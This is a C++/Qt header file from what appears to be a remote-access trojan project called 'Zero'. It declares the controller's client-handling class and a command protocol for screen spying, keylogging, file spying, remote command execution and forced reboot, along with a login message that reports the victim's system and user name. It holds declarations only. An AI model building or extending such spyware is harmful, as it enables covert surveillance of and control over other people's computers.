/*
 *  Author: sumkee911@gmail.com
 *  Date: 2016-12-19
 *  Brief: Zero远控ZeroServer主要与客户对话的类
 *
 */

#ifndef ZEROCLIENT_H
#define ZEROCLIENT_H

#include <QObject>
#include "tcpsocket.h"
#include <QTimer>
#include <QTcpSocket>
#include <QHostAddress>

class ZeroClient : public QObject
{
    Q_OBJECT
public:
    explicit ZeroClient(QTcpSocket *sock, QObject *parent = 0);

    // 服务端向客户端发送的指令(你觉得有需要你也可以增加自己的指令)
    const QByteArray CmdScreenSpy = "SCREEN_SPY";
    const QByteArray CmdKeyboardSpy = "KEYBOARD_SPY";
    const QByteArray CmdFileSpy = "FILE_SPY";
    const QByteArray CmdCmdSpy = "CMD_SPY";
    const QByteArray CmdSendMessage = "SEND_MESSAGE";
    const QByteArray CmdReboot = "REBOOT";
    const QByteArray CmdQuit = "QUIT";

    // 客户端向服务端发送的指令(你觉得有需要你也可以增加自己的指令)
    const QByteArray CmdLogin = "LOGIN";

    // 分割符号和结束符号，比如登入命令:LOGIN<分割符>SYSTEM<分割符>Windows 7<分割符>USER_NAME<分割符>sumkee911<结束符号>
    const QByteArray CmdSplit = ";";
    const QByteArray CmdEnd = "\r\n";

    // 断开客户
    void closeAndDelete();

    // 设置ID
    void setId(int id) {
        mId = id;
    }

    // 发送命令
    void sendMessage(QString &text);
    void sendReboot();
    void sendQuit();
    void sendScreenSpy(int port);
    void sendKeyboardSpy(int port);
    void sendFileSpy(int port);
    void sendCmdSpy(int port);

private:
    TcpSocket *mSock;       // 与客户通讯的socket
    QTimer *mLoginTimeout;  // 用来判断客户是否超时登入
    int mId;                // 初始值是-1, 登入后会由ZeroServer分配大于或等于0的ID号码

    // 处理指令
    // @cmd: 指令
    // @args: 参数
    void processCommand(QByteArray &cmd, QByteArray &args);

    // 分解指令的参数，反回哈希表
    QHash<QByteArray, QByteArray> parseArgs(QByteArray &args);

    // 各个指令相应的函数
    void doLogin(QHash<QByteArray, QByteArray> &args);

signals:
    // 登入和登出信号
    // @client: 自己
    void login(ZeroClient *client, QString userName, QString ip, int port, QString system);
    void logout(int id);

public slots:
    // 如果客户在制定时间内还没有登入就踢了他
    void clientLoginTimeout();

    // 客户断开
    void disconnected();

    // 接收新数据
    void newData();
};

#endif // ZEROCLIENT_H
